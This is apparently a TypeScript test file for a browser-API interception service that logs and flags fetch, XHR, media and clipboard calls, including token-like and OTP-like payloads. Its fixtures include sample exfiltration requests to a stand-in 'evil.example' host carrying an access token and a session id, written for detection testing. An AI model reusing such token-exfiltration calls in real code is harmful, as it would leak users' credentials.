import { describe, expect, it, vi } from 'vitest';
import { BrowserApiInterceptionInstallingService } from '../../../src/application/services/BrowserApiInterceptionInstallingService';
import type { BrowserApiInterceptionEventEntity } from '../../../src/domain/entities/BrowserApiInterceptionEventEntity';
import type { BrowserApiInterceptionTargetEntity } from '../../../src/domain/entities/BrowserApiInterceptionTargetEntity';

describe('BrowserApiInterceptionInstallingService', () => {
  it('captures fetch requests and restores the original fetch on uninstall', async () => {
    const originalFetch = vi.fn(async () => 'ok');
    const target: BrowserApiInterceptionTargetEntity = {
      fetch: originalFetch,
    };
    const events: BrowserApiInterceptionEventEntity[] = [];
    const uninstall = new BrowserApiInterceptionInstallingService().install({
      target,
      allowedUrls: ['https://bank.example/api/'],
      now: () => 123,
      onEvent: (event) => events.push(event),
    });

    await expect(target.fetch?.('https://evil.example/steal?access_token=abc')).resolves.toBe('ok');
    await target.fetch?.('https://bank.example/api/accounts');
    uninstall();

    expect(events).toEqual([
      {
        kind: 'fetch_requested',
        atMs: 123,
        allowed: false,
        metadata: {
          url: 'https://evil.example/steal?access_token=abc',
          hasTokenLikePayload: true,
        },
      },
      {
        kind: 'fetch_requested',
        atMs: 123,
        allowed: true,
        metadata: {
          url: 'https://bank.example/api/accounts',
          hasTokenLikePayload: false,
        },
      },
    ]);
    expect(target.fetch).toBe(originalFetch);
  });

  it('captures XHR open/send URLs and token-like bodies', () => {
    class FakeXmlHttpRequest {
      openCalls: unknown[][] = [];
      sendCalls: unknown[] = [];

      open(method: string, url: string) {
        this.openCalls.push([method, url]);
      }

      send(body?: unknown) {
        this.sendCalls.push(body);
      }
    }

    const target: BrowserApiInterceptionTargetEntity = {
      XMLHttpRequest: FakeXmlHttpRequest,
    };
    const events: BrowserApiInterceptionEventEntity[] = [];
    const uninstall = new BrowserApiInterceptionInstallingService().install({
      target,
      now: () => 456,
      onEvent: (event) => events.push(event),
    });

    const xhr = new target.XMLHttpRequest!();
    xhr.open?.('POST', 'https://evil.example/collect');
    xhr.send?.('session_id=abc');
    uninstall();

    expect(events).toEqual([
      {
        kind: 'xhr_requested',
        atMs: 456,
        allowed: false,
        metadata: {
          method: 'POST',
          url: 'https://evil.example/collect',
          hasTokenLikePayload: true,
        },
      },
    ]);
    expect(target.XMLHttpRequest).toBe(FakeXmlHttpRequest);
  });

  it('captures media and clipboard calls with derived metadata', async () => {
    const target: BrowserApiInterceptionTargetEntity = {
      navigator: {
        mediaDevices: {
          getUserMedia: vi.fn(async () => ({ getTracks: () => [] }) as unknown as MediaStream),
        },
        clipboard: {
          readText: vi.fn(async () => 'OTP 123456'),
          writeText: vi.fn(async () => undefined),
        },
      },
    };
    const events: BrowserApiInterceptionEventEntity[] = [];
    const uninstall = new BrowserApiInterceptionInstallingService().install({
      target,
      now: () => 789,
      onEvent: (event) => events.push(event),
    });

    await target.navigator?.mediaDevices?.getUserMedia?.({ audio: true, video: false });
    await target.navigator?.clipboard?.readText?.();
    await target.navigator?.clipboard?.writeText?.('plain text');
    uninstall();

    expect(events).toEqual([
      {
        kind: 'media_requested',
        atMs: 789,
        allowed: false,
        metadata: {
          audio: true,
          video: false,
        },
      },
      {
        kind: 'clipboard_read',
        atMs: 789,
        allowed: false,
        metadata: {
          textLength: 10,
          hasOtpPattern: true,
          hasTokenLikePayload: true,
        },
      },
      {
        kind: 'clipboard_write',
        atMs: 789,
        allowed: false,
        metadata: {
          textLength: 10,
          hasOtpPattern: false,
          hasTokenLikePayload: false,
        },
      },
    ]);
  });
});
